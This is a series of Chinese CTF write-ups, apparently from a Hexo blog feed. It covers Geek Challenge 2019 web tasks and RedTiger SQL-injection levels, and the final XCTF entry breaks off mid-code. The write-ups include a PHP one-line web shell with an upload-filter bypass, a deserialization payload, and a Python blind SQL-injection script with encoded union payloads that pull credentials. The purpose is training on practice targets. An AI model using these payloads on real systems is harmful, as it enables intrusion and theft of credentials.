        <content type="html"><![CDATA[<h1 id="极客大挑战2019-buy-flag"><a href="#极客大挑战2019-buy-flag" class="headerlink" title="极客大挑战2019-buy_flag"></a>极客大挑战2019-buy_flag</h1><p>首先打开题目，感觉这页面做的还挺好<br><img src="https://i.loli.net/2021/02/06/Tv4bFYsgQOhNIku.png"></p><p>发现了一个buy.php，进去看一下<br><img src="https://i.loli.net/2021/02/06/ZinqNfLhDFPxlHE.png" alt="随便扫一眼"><br>这里好像有点提示</p><p>打开源码看一下，有注释掉的内容<br><img src="https://i.loli.net/2021/02/06/QGyo3lnsk61hCiF.png"></p><p>这个就是要把password写成404，但又不能全是数字，直接构造成404a，这个越过很简单</p><p>先抓个包看一下<br><img src="https://i.loli.net/2021/02/06/K8LCpFAechu7vYa.png"><br>要求要成为他的学生，这可怎么办，突然发现cookie里面有一个user=0，感觉有点奇怪，把0改成1再来看</p><p>现在就对了，接下来就是输入password了<br><img src="https://i.loli.net/2021/02/06/dHXmYrtq7BzDc32.png"></p><p><img src="https://i.loli.net/2021/02/06/gTzHUOvC7EPo8yK.png" alt="这个passwrod成功越过了"><br>最后就是money了</p><p><img src="https://i.loli.net/2021/02/06/hJgOukx68Iovedm.png" alt="它说money的数字长度太长了"><br>我看了网上一些大佬的wp，知道可以改成money[]来越过<br>但是我当时做的时候，就直接把它改成了科学计数法</p><p><img src="https://i.loli.net/2021/02/06/rJU8I4iMGLDAO6Z.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-babysql</title>
      <link href="2021/01/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-babysql/"/>
      <url>2021/01/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-babysql/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战2019-babysql"><a href="#极客大挑战2019-babysql" class="headerlink" title="极客大挑战2019-babysql"></a>极客大挑战2019-babysql</h1><p>首先打开题目,又是一道平平无奇的sql注入<br><img src="https://i.loli.net/2021/01/31/3BrPd1lCintpOFL.png"></p><p>首先先试一下万能密码，但是好像不行</p><p>然后测试一下会不会有sql报错<br><img src="https://i.loli.net/2021/01/31/pt1J4QIkyjzCRGY.png"><br><img src="https://i.loli.net/2021/01/31/f4mQXYv1zn2lUAP.png" alt="有报错"></p><p>还是按照常理select一下，但是这个也报错了<br>有点不知道为什么，查了一下才知道这是双写注入<br><img src="https://i.loli.net/2021/01/31/AC2THuKBe8Jri5k.png"></p><p>那稍微改一下payload<br><img src="https://i.loli.net/2021/01/31/z1SOgMapLmYxwrc.png" alt="成功的显回了"></p><p>接下来需要做的就是像往常一样的sql注入了，先爆database<br><img src="https://i.loli.net/2021/01/31/cpimtZ6UlN31yxG.png" alt="再爆table_shcema"></p><p><img src="https://i.loli.net/2021/01/31/k2YDHW6SgVeK7dU.png" alt="接着爆table_name"></p><p><img src="https://i.loli.net/2021/01/31/U2VHxiL7rqCeSYP.png" alt="再爆column_name"><br>后面接着继续感觉没什么结果啊，后来才发现自己的一个坏习惯，不喜欢group_concat<br>于是回过头来再爆column_name<br><img src="https://i.loli.net/2021/01/31/3PCN7vsHzrmI4jw.png" alt="这次把column_name给爆全了"></p><p>最后直接爆出password就好了<br><img src="https://i.loli.net/2021/01/31/3cbaivxCtfHjwFM.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-upload</title>
      <link href="2021/01/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/"/>
      <url>2021/01/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战2019-upload"><a href="#极客大挑战2019-upload" class="headerlink" title="极客大挑战2019 upload"></a>极客大挑战2019 upload</h1><p>首先打开题目，还是一样的上传🐎<br><img src="https://i.loli.net/2021/01/30/VLSwGjeiYyrUJHO.png"></p><p>一开始直接用php写的🐎好像被它直接过滤掉了，那么我们就用js来写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>好了</p><p><img src="https://i.loli.net/2021/01/30/3LEXz5xheWQZgfs.png" alt="用burp suite抓包"><br>把🐎先传上去</p><p>这里是学的新知识<br><img src="https://i.loli.net/2021/01/30/pUkbrhlfnuGN6g4.png"><br>先把格式改成phtml，来越过第一个检测，后面在🐎前面加上GIF89a? 构成图片欺骗</p><p><img src="https://i.loli.net/2021/01/30/HtzoAerMgClfjZV.png" alt="上传成功"></p><p>接下来就直接蚁剑连上去就好了</p><p><img src="https://i.loli.net/2021/01/30/AsXk2Rw4lhO89TS.png"><br>这里的url我还找了一会，结果是在/upload里面</p><p><img src="https://i.loli.net/2021/01/30/I4OK95rdHcSoWxv.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019-php</title>
      <link href="2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-php/"/>
      <url>2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-php/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战-I-have-a-cat"><a href="#极客大挑战-I-have-a-cat" class="headerlink" title="极客大挑战 I have a cat"></a>极客大挑战 I have a cat</h1><p>首先打开题目，提示是备份<br><img src="https://i.loli.net/2021/01/30/Bq2sJx6aUZeHoMD.png"><br>那就直接开始扫</p><p><img src="https://i.loli.net/2021/01/30/a4ln7rTxeR8XvfS.png" alt="扫到了"><br>那就下下来看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">         </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码都放上去了</p><p>看了一下大佬的构造</p><blockquote><p> o是对象，s是字符串，i是数字<br>   因为是private修饰的所以要加上%00当空格<br>   构造:0:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p></blockquote><p><img src="https://i.loli.net/2021/01/30/sWxqE1hJGc3Bt84.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019_Http</title>
      <link href="2021/01/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/"/>
      <url>2021/01/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战2019-Http"><a href="#极客大挑战2019-Http" class="headerlink" title="极客大挑战2019_Http"></a>极客大挑战2019_Http</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/24/4ZatkbUmTuJQzgB.png" alt="好像没有什么信息"><br>用burpsuite看一下有什么东西</p><p><img src="https://i.loli.net/2021/01/24/QCirTqL3XBtxIN9.png"><br>发现了一个Secret.php，打开看一下</p><p><img src="https://i.loli.net/2021/01/24/xEtu5ZfDsi8Vbkn.png" alt="用repeater看一下"><br>有了新的要求，那用referer伪造一下</p><p><img src="https://i.loli.net/2021/01/24/lx3f7pFbKCwkUzL.png" alt="又有新的要求"><br>咱们继续伪造</p><p><img src="https://i.loli.net/2021/01/24/PJUSW9wVZA8RBdM.png" alt="要伪造本地的代理"><br>那就伪造XFF就好了</p><p><img src="https://i.loli.net/2021/01/24/xKHbcLNTnqfp6SU.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019_LoveSQL1</title>
      <link href="2021/01/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/"/>
      <url>2021/01/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战2019-LoveSQL"><a href="#极客大挑战2019-LoveSQL" class="headerlink" title="极客大挑战2019_LoveSQL"></a>极客大挑战2019_LoveSQL</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/24/cfYuvnQkemx9JqT.png"><br>根据题目名字，确定这肯定是一个sql注入<br>首先试一下万能密码，看能不能登进去</p><p><img src="https://i.loli.net/2021/01/24/XwKs73EJLgMN9m2.png" alt="成功了"><br>既然万能密码登进去了，那后面的基本上就简单了</p><p><img src="https://i.loli.net/2021/01/24/EH8kTscSl5fNMxV.png"><br>看一下有几组<br><img src="https://i.loli.net/2021/01/24/4ZEe2JYshrfnbmB.png" alt="有三组"></p><p><img src="https://i.loli.net/2021/01/24/Lin6rPtOCFEXkmh.png" alt="看看那些有回显"><br>2和3有回显，那先看一下database</p><p><img src="https://i.loli.net/2021/01/24/AdLCGQYiUFaMnvS.png" alt="查到了database"></p><p>继续查table_name<br><img src="https://i.loli.net/2021/01/24/G8mnbzxBkAUNOfC.png"></p><p>这两个table名中好像是一样的，那就随便看一个<br><img src="https://i.loli.net/2021/01/24/jCzbIOaXhoHAYU2.png"><br>得到三个表名</p><p>最后一步，把他们都显出来<br><img src="https://i.loli.net/2021/01/24/T5vYFOcCxiKSb64.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019_secret_file</title>
      <link href="2021/01/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-secret-file/"/>
      <url>2021/01/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-secret-file/</url>
      
        <content type="html"><![CDATA[<h1 id="即可大挑战2019-secret-file"><a href="#即可大挑战2019-secret-file" class="headerlink" title="即可大挑战2019 secret file"></a>即可大挑战2019 secret file</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/20/X38yAOeDlMGFuEt.png" alt="啥也不是"><br>我们直接去看源码</p><p><img src="https://i.loli.net/2021/01/20/DnB2h3Oig8tN5zV.png"><br>这里发现了一点小秘密<br>题目把这里的颜色调成跟背景颜色一样，所以看不到，那我们直接进到这个./Archieve.php里面去</p><p><img src="https://i.loli.net/2021/01/20/SUtJEe1Mo6sPmxF.png" alt="同样藏了一点东西"><br>那我们还是一样，去到./action.php里面</p><p><img src="https://i.loli.net/2021/01/20/i4ZY1My5e7WUOSK.png" alt="好像不对"><br>它自动跳转到了end.php里面，那就用burp suite去抓包，这次就不会让它跑了</p><p><img src="https://i.loli.net/2021/01/20/i4ZY1My5e7WUOSK.png" alt="发现了"><br>果然有个secr3t.php藏在里面，进去看看</p><p><img src="https://i.loli.net/2021/01/20/qoIuZGkzXn7eOiT.png" alt="看源码"><br>知道了要用filter去越过，找到包含文件</p><p><img src="https://i.loli.net/2021/01/20/UeGTCgcpt28QvLf.png" alt="马上要成功了"><br>然后解码</p><p><img src="https://i.loli.net/2021/01/20/2QUg9ALvemxoybd.png" alt="万能的burp suite"></p><blockquote><p>得到flag!</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>redtiger_forth</title>
      <link href="2021/01/17/redtiger-forth/"/>
      <url>2021/01/17/redtiger-forth/</url>
      
        <content type="html"><![CDATA[<h1 id="redtiger-forth"><a href="#redtiger-forth" class="headerlink" title="redtiger_forth"></a>redtiger_forth</h1><p>Target: Get the value of the first entry in table level4_secret in column keyword<br>Disabled: like<br>看题目是布尔注入<br>随便输入一些东西，指挥返回0和1</p><p>这就去学习了一下布尔类型的sql注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;redtiger.labs.overthewire.org&#x2F;level4.php?id&#x3D;1 and 1&#x3D;(select length(keyword)&#x3D;21 from level4_secret)</span><br></pre></td></tr></table></figure><p>构造出来一个url</p><p>然后看了一下大佬的wp<br>写一个简单的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">keword=<span class="string">&#x27;&#x27;</span></span><br><span class="line">char=string.printable</span><br><span class="line">url=<span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php?id=1 and 1=(select ascii(substr((select keyword from level4_secret),&#123;0&#125;,1))=&#123;1&#125;)&#x27;</span></span><br><span class="line">cookie=&#123;<span class="string">&#x27;level4login&#x27;</span>:<span class="string">&#x27;there_is_no_bug&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char:</span><br><span class="line">        test=url.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(c))</span><br><span class="line">        r=requests.get(test,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;Query returned 1 rows.&#x27;</span>,r.text):</span><br><span class="line">            <span class="built_in">print</span> i,c</span><br><span class="line">            keword+=c</span><br><span class="line"><span class="built_in">print</span> keword</span><br></pre></td></tr></table></figure><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>redtiger_third</title>
      <link href="2021/01/16/redtiger-third/"/>
      <url>2021/01/16/redtiger-third/</url>
      
        <content type="html"><![CDATA[<h1 id="redtiger-third"><a href="#redtiger-third" class="headerlink" title="redtiger_third"></a>redtiger_third</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/17/9E5bipaHStBxIWk.png"></p><p>点开一个看看<br><img src="https://i.loli.net/2021/01/17/Wsb82kXGAgnQlHN.png"></p><p>根据题目的提示，感觉是报错注入<br>试了一下各种报错好像都没有成功，看了wp知道是数组的报错<br>将rul改成usr[]=。。。。。。</p><p><img src="https://i.loli.net/2021/01/17/hwUVpbnRfcNezKT.png" alt="成功报错了"></p><p>将文件下载下来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        srand(<span class="number">3284724</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        srand(<span class="number">3284724</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">                    <span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后抄袭了一下大佬的加密过程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># order by</span></span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php?usr=Admin&#x27; order by 6</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMzMDY4MTc1MDg5 </span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php?usr=Admin&#x27; order by 7</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY4MTc1MDg5</span><br><span class="line"><span class="comment"># order by 会报错，不晓得为啥，但是union就查询正常～～</span></span><br><span class="line"><span class="comment"># union 查回显</span></span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=<span class="string">&#x27; union select 1,2,3,4,5,6,7&#x27;</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDc2MTk0MDEzMTgyMTQxMjMxMjIzMDc1MTk5MTA5MTg0MTU5MDkzMjM5MDc4MDczMjM3MDc3MTc0MDcwMDU3MTk5MjM0MjE5MDgyMjQ2MTUzMjE5</span><br><span class="line"><span class="comment"># 查用户名和密码</span></span><br><span class="line">original:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php?usr=&#x27; union select 1,username,3,4,5,password,7 from level3_users where username=&#x27;Admin</span></span><br><span class="line">encode:</span><br><span class="line">https:<span class="comment">//redtiger.labs.overthewire.org/level3.php</span></span><br><span class="line">?usr=MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDIwMjM4MDE1MTI3MTMzMTkwMTU0MDAxMjQ2MTU3MjA4MTc3MDk2MTI4MjIwMTE2MTIxMTYzMTQ5MjEzMTYwMTA4MDMyMjUyMjAzMDk3MTU2MTkwMTc1MDEzMTM5MDc4MTU1MDk2MDg1MTM0MTk3MTE5MDU5MTYzMTc4MDU2MDM3MDAzMTM2MDQ3MDY2MTA2MTE0MDQ2MjA2MTQ4MDcyMTQxMjE0MDc1MDQ0MjE1MjAzMDM3MDgyMTk4MDcyMTIzMjE1</span><br></pre></td></tr></table></figure><pre><code>得到加密后的url</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDE3MjUyMDI1MTI2MTU2MTc2MTMzMDAwMjQ2MTU2MjA4MTgyMDk2MTI5MjIwMDQ5MDUyMjMwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTkwMjIwMDcxMDQwMjIw</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/7oAaSTgc3vpZVnX.png"></p><blockquote><p>得到flag！</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-4th-CyberEarth</title>
      <link href="2021/01/14/XCTF-4th-CyberEarth/"/>
      <url>2021/01/14/XCTF-4th-CyberEarth/</url>
      
        <content type="html"><![CDATA[<h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/14/YnbcwaP6Z9XJWEk.png"></p><p>下面有hint<br>就点开看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">       <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">       <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">       <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">       <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">       <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">       <span class="keyword">die</span>();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span 